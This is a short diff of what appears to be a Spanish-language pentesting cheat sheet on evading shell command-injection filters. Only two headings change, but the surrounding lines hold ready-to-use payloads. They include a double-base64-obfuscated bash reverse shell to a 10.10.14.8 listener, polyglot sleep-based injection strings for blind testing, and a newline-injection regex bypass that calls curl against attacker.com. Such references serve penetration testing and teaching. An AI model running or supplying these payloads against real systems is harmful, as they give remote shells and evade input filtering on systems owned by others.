@@ -4,7 +4,7 @@
 
 ## Bypasses de Limitaciones Comunes
 
-### Shell Inversa
+### Reverse Shell
 ```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
@@ -203,7 +203,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Eludir expresiones regulares potenciales
+### Bypass potenciales regexes
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
